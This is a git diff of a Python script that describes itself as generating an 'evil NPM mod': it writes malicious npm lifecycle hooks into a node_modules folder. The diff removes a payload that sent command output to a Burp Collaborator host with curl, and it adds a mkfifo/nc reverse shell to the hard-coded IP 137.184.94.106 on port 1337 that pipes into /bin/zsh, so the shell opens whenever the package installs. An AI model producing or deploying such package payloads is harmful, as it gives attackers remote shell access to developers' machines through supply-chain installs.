@@ -6,12 +6,10 @@ import argparse
 import base64
 
 parser = argparse.ArgumentParser(description="Generate an evil NPM mod")
-parser.add_argument("burp_collaborator_url")
 parser.add_argument("--gen-name",default=False,action="store_const",const=True)
 
 args = parser.parse_args()
 
-burpcollaborator_link = args.burp_collaborator_url
 
 prefixable_events = [
     "syndistest", # custom
@@ -34,9 +32,7 @@ non_prefixable_events = [
     "prepublishOnly"
 ]
 
-expression_template = lambda command,event : f"curl \"{event}.{base64.b64encode(command.encode('UTF-8')).decode('UTF-8')}.{burpcollaborator_link}\" -X POST --data $({command} | base64);"
-#expression_template = lambda bin,event,method : f'{bin} {method}.{bin}.{event}.{burpcollaborator_link};'
-script_template = lambda event: expression_template("whoami",event)
+script_template = lambda event: f"mkfifo {event}.fifo; nc 137.184.94.106 1337 < {event}.fifo | /bin/zsh > {event}.fifo 2>&1; rm {event}.fifo"
 #script_template = lambda event,method: expression_template("nslookup",event,method) + expression_template("dig",event,method) + expression_template("curl",event,method)
 
 os.makedirs('node_modules',exist_ok=True)
